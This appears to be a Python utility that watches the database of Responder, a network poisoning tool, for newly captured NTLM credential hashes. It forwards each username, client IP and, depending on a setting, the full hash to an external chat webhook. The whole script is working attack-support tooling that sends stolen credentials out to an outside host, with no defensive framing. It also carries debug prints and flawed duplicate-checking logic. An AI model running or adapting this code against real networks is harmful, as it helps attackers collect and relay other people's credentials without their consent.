from time import sleep
import requests, sqlite3, json, datetime

def sendWebhook(hookPayload):
    r = requests.post(url=webhook, headers={'Content-Type': 'application/json'}, data=json.dumps(hookPayload))

def DbConnect(dbFile):
    cursor = sqlite3.connect(dbFile)
    return cursor

def checkNewHash(cursor, lastTime):
    # Search for any hash in the db newer than the lastTime 
    res = cursor.execute(f"SELECT user,type,client,fullhash FROM Responder WHERE timestamp > '{lastTime}'")
    Output = []
    # Store the results in a list of lists to reference later
    for row in res.fetchall():
        # Check if we're discarding duplicates
        if discardDupes:
            print("yep try to drop dupes")
            userNew = row[0]
            print(f"userNew is {userNew}")
            checkPrevHash = cursor.execute(f"SELECT user,client FROM Responder WHERE timestamp < '{lastTime}'")
            for bleh in checkPrevHash:
                print(f"bleh is {bleh[0]}")
                if bleh[0] == userNew:
                    return False
        Output.append([row[0], row[1], row[2], row[3]])
    return Output

def sendHash():
    global lastTime, hookPayload
    result = checkNewHash(cursor,lastTime)
    if result:
        # Loop over each result
        for i in result:
            hashType = f":potato: *Type:* {i[1]}"
            userName = f":person_doing_cartwheel: *User:* {i[0]}"
            # Check if IPv4, strip leading ::ffff:
            if "::ffff:" in i[2]:
                i[2] = i[2].replace("::ffff:","")
            compIP = f":computer: *IP:* {i[2]}"
            hookPayload["blocks"][2]["elements"][0]["text"] = hashType
            hookPayload["blocks"][2]["elements"][1]["text"] = userName
            hookPayload["blocks"][2]["elements"][2]["text"] = compIP
            # Check config if sending hash in webhook, then add the fullHash
            if not retrieveHash:
                i[3] = "Check local Responder logs for hash"
            hookPayload["blocks"][3]["text"]["text"] = f"```{i[3]}```"
            sendWebhook(hookPayload)
        return True
    else:
        # print("Nope, nothing. Sorry.")
        return False

def loadConfig():
    global hookPayload, respDB, webhook, sleepTime, retrieveHash, discardDupes, botToken
    
    # This file is the base of the webhook and used to format the message
    with open("./hookBase.json", "r") as hookBase:
        hookPayload = json.loads(hookBase.read())
    
    with open("./config.json", "r") as configFile:
        config = json.loads(configFile.read())
    
    respDB = config["ResponderDB"]
    webhook = config["webhookURL"]
    sleepTime = config["sleepTime"]
    retrieveHash = config["sendHash"]
    discardDupes = config["discardDupes"]
    botToken = config["botToken"]
    if webhook == "replaceMe":
        raise ValueError("Must add webhook URL in config.json!")

def main():
    global cursor, lastTime

    loadConfig()
    cursor = DbConnect(respDB)
    lastTime = datetime.datetime.utcnow()

    while True:
        checkHash = sendHash()
        if checkHash:
            lastTime = datetime.datetime.utcnow()
        sleep(sleepTime)

if __name__ == "__main__":
    main()